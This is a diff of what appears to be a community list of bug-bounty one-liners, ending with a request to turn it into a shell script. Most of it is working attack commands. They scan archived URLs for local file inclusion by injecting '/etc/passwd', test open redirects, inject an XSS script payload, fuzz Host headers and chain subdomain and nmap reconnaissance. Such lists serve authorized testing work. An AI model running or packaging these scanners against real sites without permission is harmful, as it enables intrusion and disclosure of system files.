@@ -1,9 +1,9 @@
-# Step 1: Find Subdomains
-domain="HOST"
-subfinder -d $domain -silent -o subdomains.txt
-assetfinder --subs-only $domain | tee -a subdomains.txt
-amass enum -passive -d $domain -o subdomains.txt
-sort -u subdomains.txt -o subdomains.txt
+# Awesome One-liner Bug Bounty
+
+# A collection of awesome one-liner scripts especially for bug bounty.
+
+# This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily welcome.
+
 ## Definitions
 
 This section defines specific terms or placeholders that are used throughout one-line command/scripts.
@@ -18,11 +18,14 @@ This section defines specific terms or placeholders that are used throughout one
 ---
 
 ### Local File Inclusion
+
+
 gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ### Open-redirect
+
+
 export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
-### Subdomain Takeover
-subfinder -d HOST -silent | subzy
+
 cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
 ### XSS
 
@@ -239,28 +242,30 @@ site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https:/
 
 ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt 
 ### Recon Using api.recon.dev
-
+> @z0idsec
 
 curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain
 ### Find Live Host/Domain/Assets
+> @_YashGoti_
 
 subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
 ### XSS without gf
-
+> @HacktifyS
 
 waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
 ### Get Subdomains from IPs
-
+> @laughface809
 
 python3 hosthunter.py HOSTS.txt > OUT.txt
 ### Gather Domains from Content-Security-Policy
-
+> @geeknik
 
 curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
 ### Nmap IP:PORT Parser Piped to HTTPX
-
+> @dwisiswant0
 
 nmap -v0 HOST -oX /dev/stdout | jc --xml -p | jq -r '.nmaprun.host | (.address["@addr"] + ":" + .ports.port[]["@portid"])' | httpx --silent
 
 
 
+make this one .sh
